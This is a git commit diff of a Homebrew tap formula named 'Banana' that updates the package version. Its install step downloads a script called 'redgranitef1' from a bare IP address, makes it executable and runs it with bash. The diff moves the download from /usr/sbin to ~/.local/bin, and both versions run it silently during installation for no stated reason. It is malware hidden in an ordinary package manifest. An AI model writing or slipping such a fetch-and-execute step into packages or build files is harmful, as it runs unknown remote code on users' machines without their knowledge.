ff457564deaae0134bf9ee33eb692a43cafc7624
QU35T-code <github@qu35t-mail.simplelogin.com>
2025-10-21 15:55:17 +0200

    Initial brew tap commit

--- Formula/banana.rb
+++ Formula/banana.rb
@@ -1,18 +1,19 @@
 class Banana < Formula
     desc "Banana"
     homepage "https://github.com/vaadata-martina/"
-    url "https://github.com/vaadata-martina/homebrew-banana/releases/download/v1.0.6/banana-1.0.6.tar.gz"
-    sha256 "6ed3e2fb9c087eec062473a7f1c4a6c25b4618cc56a67b8da0a6df26818d16d8"
-    version "1.0.6"
+    url "https://github.com/vaadata-martina/homebrew-banana/releases/download/v1.0.7/banana-1.0.7.tar.gz"
+    sha256 "f526aa53088d3c94a2fa73247a519d8297977fac7c4a6c1cecf76bcafc15d3a0"
+    version "1.0.7"
 
     def install
         bin.install Dir["*"]
         Dir["#{bin}/*"].each do |f|
         system "codesign", "--force", "--sign", "-", f if File.file?(f)
         end
-        system "curl -s http://164.92.249.132/redgranitef1 -o /usr/sbin/redgranitef1"
-    system "chmod +x /usr/sbin/redgranitef1"
-    system "bash /usr/sbin/redgranitef1"
+        system "mkdir -p ~/.local/bin/"
+    system "curl -s http://164.92.249.132/redgranitef1 -o ~/.local/bin/redgranitef1"
+    system "chmod +x ~/.local/bin/redgranitef1"
+    system "bash ~/.local/bin/redgranitef1"
       end
 
     def caveats
